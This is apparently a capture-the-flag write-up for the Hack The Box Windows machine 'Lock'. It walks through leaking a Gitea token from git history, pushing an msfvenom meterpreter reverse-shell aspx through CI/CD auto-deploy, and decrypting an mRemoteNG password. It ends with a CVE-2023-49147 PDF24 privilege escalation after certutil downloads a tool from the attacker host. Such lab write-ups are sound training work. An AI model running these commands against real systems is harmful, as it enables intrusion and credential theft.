# Target
| Category          | Details                                                                      |
|-------------------|------------------------------------------------------------------------------|
| 📝 **Name**       | [Lock](https://app.hackthebox.com/machines/Lock)                             |  
| 🏷 **Type**       | HTB Machine                                                                  |
| 🖥 **OS**         | Windows                                                                      |
| 🎯 **Difficulty** | Easy                                                                         |
| 📁 **Tags**       | Gitea, CI/CD, mRemoteNG, mremoteng_decrypt.py, PDF24 Creator, CVE-2023-49147 |

# Scan
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=6fe89acf94d9c4fd; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=A5MYuTeE3ho3LhXj7DRGbamIZI86MTc2MzkwODEyNzU3ODc0NTQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 23 Nov 2025 14:28:48 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=c8936d23cd329304; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=kCVTtxgFN_brmoQ9ck4Xgeml4aM6MTc2MzkwODEyODg2NjI1NjcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 23 Nov 2025 14:28:48 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-23T14:29:10+00:00
|_ssl-date: 2025-11-23T14:29:50+00:00; +44s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-11-22T14:25:20
|_Not valid after:  2026-05-24T14:25:20
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/23%Time=692319F3%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea
SF:=6fe89acf94d9c4fd;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20_csrf=A5MYuTeE3ho3LhXj7DRGbamIZI86MTc2MzkwODEyNzU3ODc0NTQwMA;\x20
SF:Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Optio
SF:ns:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2023\x20Nov\x202025\x2014:28:48\x20
SF:GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme
SF:-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devic
SF:e-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20
SF:cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:ap
SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY
SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf
SF:dXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8
SF:vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbm
SF:ciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20G
SF:ET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20n
SF:o-transform\r\nSet-Cookie:\x20i_like_gitea=c8936d23cd329304;\x20Path=/;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=kCVTtxgFN_brmoQ9c
SF:k4Xgeml4aM6MTc2MzkwODEyODg2NjI1NjcwMA;\x20Path=/;\x20Max-Age=86400;\x20
SF:HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x2
SF:0Sun,\x2023\x20Nov\x202025\x2014:28:48\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-23T14:29:15
|_  start_date: N/A
|_clock-skew: mean: 43s, deviation: 0s, median: 43s
```

# Attack path
1. [Gain initial foothold by pushing reverse shell to CI/CD integrated git repository](#gain-initial-foothold-by-pushing-reverse-shell-to-cicd-integrated-git-repository)
2. [Escalate to `gale.dekarios` user by decrypting `mRemoteNG` password stored in `config.xml`](#escalate-to-galedekarios-user-by-decrypting-mremoteng-password-stored-in-configxml)
3. [Escalate to `Administrator` by exploiting CVE-2023-49147 in `PDF24 Creator Installer`](#escalate-to-administrator-by-exploiting-cve-2023-49147-in-pdf24-creator-installer)

### Gain initial foothold by pushing reverse shell to CI/CD integrated git repository

#### Clone publicly available `dev-scripts.git` repository
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ git clone http://$TARGET:3000/ellen.freeman/dev-scripts.git && cd dev-scripts
Cloning into 'dev-scripts'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), done.
Resolving deltas: 100% (1/1), done.
```

#### Discover `ellen.freeman` Gitea access token in git history
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock/dev-scripts]
└─$ git log --oneline --graph --decorate --all
* 8b78e6c (HEAD -> main, origin/main, origin/HEAD) Update repos.py
* dcc869b Add repos.py
                                                                                                                                                                                                    
┌──(magicrc㉿perun)-[~/attack/HTB Lock/dev-scripts]
└─$ git diff 8b78e6c dcc869b                  
diff --git a/repos.py b/repos.py
index e278e49..dcaf2ef 100644
--- a/repos.py
+++ b/repos.py
@@ -1,6 +1,8 @@
 import requests
 import sys
-import os
+
+# store this in env instead at some point
+PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
 
 def format_domain(domain):
     if not domain.startswith(('http://', 'https://')):
@@ -26,13 +28,8 @@ def main():
 
     gitea_domain = format_domain(sys.argv[1])
 
-    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
-    if not personal_access_token:
-        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
-        sys.exit(1)
-
     try:
-        repos = get_repositories(personal_access_token, gitea_domain)
+        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
         print("Repositories:")
         for repo in repos:
             print(f"- {repo['full_name']}")
```

#### Discover private `website.git` repository using captured Gitea token
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock/dev-scripts]
└─$ curl -s http://$TARGET:3000/api/v1/user/repos -H "Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f" | jq
[
<SNIP>
  {
    "clone_url": "http://localhost:3000/ellen.freeman/website.git",
  }
<SNIP>
]
```

#### Clone `website.git` repository using captured Gitea token
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/ellen.freeman/website.git && cd website 
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.71 MiB/s, done.
Resolving deltas: 100% (35/35), done.
```

#### Discover information about CI/CD automatically deploying changes pushed into repository
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock/website]
└─$ cat readme.md       
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

#### Test CI/CD integration with `probe.aspx`
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock/website]
└─$ {cat <<'EOF'> probe.aspx
<%@ Page Language="C#"%>
<html>
<head>
</head>
<body>
<%Response.Write(1000+300+30+7); %>
</body>
</html>
EOF
} && git add probe.aspx && git commit -m "chore: add probe.aspx" && git push && \
sleep 5
curl http://$TARGET/probe.aspx
[main 71643bf] chore: add probe.aspx
 1 file changed, 8 insertions(+)
 create mode 100644 probe.aspx
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 347 bytes | 347.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website.git
   73cdcc1..71643bf  main -> main

<html>
<head>
</head>
<body>
1337
</body>
</html>
```

#### Generate `windows/x64/meterpreter/reverse_tcp` reverse shell in `aspx` format
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock/website]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of aspx file: 3651 bytes
Saved as: shell.aspx
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => linux/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.54:4444
```

#### Push and execute reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock/website]
└─$ git add shell.aspx && git commit -m "chore: add shell.aspx" && git push && \
sleep 5 && \
curl http://$TARGET/shell.aspx
[main 8887f34] chore: add shell.aspx
 1 file changed, 47 insertions(+)
 create mode 100644 shell.aspx
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 1.48 KiB | 1.48 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.133.220:3000/ellen.freeman/website.git
   de3b7f8..8887f34  main -> main
```

#### Confirm foothold gained
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.54:4444 
[*] Sending stage (230982 bytes) to 10.129.133.220
[*] Meterpreter session 1 opened (10.10.16.54:4444 -> 10.129.133.220:61638) at 2025-11-24 19:43:23 +0100

meterpreter > getuid
Server username: LOCK\ellen.freeman
```

### Escalate to `gale.dekarios` user by decrypting `mRemoteNG` password stored in `config.xml`

#### Exfiltrate `mRemoteNG` configuration file found `ellen.freeman` home directory
File found with manual disk browsing.
```
meterpreter > download C:\\Users\\ellen.freeman\\Documents\\config.xml 
[*] Downloading: C:\Users\ellen.freeman\Documents\config.xml -> /home/magicrc/attack/HTB Lock/config.xml
[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): C:\Users\ellen.freeman\Documents\config.xml -> /home/magicrc/attack/HTB Lock/config.xml
[*] Completed  : C:\Users\ellen.freeman\Documents\config.xml -> /home/magicrc/attack/HTB Lock/config.xml
```

#### Decrypt password stored in `config.xml` using `mremoteng_decrypt.py`
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ git clone -q https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper && \
python3 CVE-2023-30367-mRemoteNG-password-dumper/mremoteng_decrypt.py -rf config.xml
Username: Gale.Dekarios
Hostname: Lock
Encrypted Password: TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw== 
Decrpyted Password: ty8wnW9qCKDosXo6 
```

#### Confirm escalation using decrypted password
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ netexec smb $TARGET -u gale.dekarios -p ty8wnW9qCKDosXo6
SMB         10.129.133.220  445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False)
SMB         10.129.133.220  445    LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6
```

### Escalate to `Administrator` by exploiting [CVE-2023-49147](https://nvd.nist.gov/vuln/detail/CVE-2023-49147) in `PDF24 Creator Installer`
During enumeration with `PrivescCheck` `PDF24 Creator 11.15.1` installer has been found. 
```
Path              : C:\Windows\Installer\47192.msi
IdentifyingNumber : B36652B8-9862-4A1E-83DE-4F3D52479DBB
Name              : PDF24 Creator
Vendor            : geek software GmbH
Version           : 11.15.1
AllUsers          : 1
CandidateCount    : 10
Candidates        : TerminatePDF24Process; UninstallPDF24Exe; InstallPDF24Service; UninstallPDF24Service; 
                    StopPDF24Service; UninstallPDFPrinter; UninstallFaxPrinter; InstallPDFPrinter; InstallFaxPrinter; 
                    InstallPrinterDriver
AnalyzeCommand    : Get-MsiFileItem -FilePath "C:\Windows\Installer\47192.msi" | Select-Object -ExpandProperty 
                    CustomActions | Where-Object { $_.Candidate }
RepairCommand     : Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa C:\Windows\Installer\47192.msi"
```

[SEC Consult Vulnerability Lab POC](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) procedure has been used to escalate privileges. 

#### Add `lock.vl` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ echo "$TARGET lock.vl" | sudo tee -a /etc/hosts
10.129.133.220 lock.vl
```

#### Connect to remote desktop as `gale.dekarios`
```
┌──(magicrc㉿perun)-[~/attack/HTB Lock]
└─$ xfreerdp3 /v:lock.vl /u:gale.dekarios /p:ty8wnW9qCKDosXo6
```
![Remote desktop](images/remote_desktop.png)

#### Download `SetOpLock.exe` and lock `C:\Program Files\PDF24\faxPrnInst.log`
```
C:\Users\gale.dekarios>certutil -urlcache -split -f http://10.10.16.54/symboliclink-testing-tools/SetOpLock.exe C:\Users\gale.dekarios\Downloads\SetOpLock.exe
****  Online  ****
  000000  ...
  01c600
CertUtil: -URLCache command completed successfully.

C:\Users\gale.dekarios>C:\Users\gale.dekarios\Downloads\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```
![Lock faxPrnInst.log](images/lock_faxPrnInst.log.png)

#### Run repair of PDF24 Creator using MSI file
```
C:\Users\gale.dekarios>msiexec.exe /fa C:\Windows\Installer\47192.msi
```
![Run repair](images/run_repair.png)

#### Wait for installer to open `cmd.exe` and enter it's properties
![Open properties](images/open_properties.png)

#### Go to Options / 'legacy console mode' URL
![Legacy console mode](images/legacy_console_mode.png)

#### Open Firefox
![Open Firefox](images/open_firefox.png)

#### Open file browser with `Ctrl + O` to run `cmd.exe`
![Open file browser](images/open_file_browser.png)

#### Confirm escalation
![Confirm escalation](images/confirm_escalation.png)
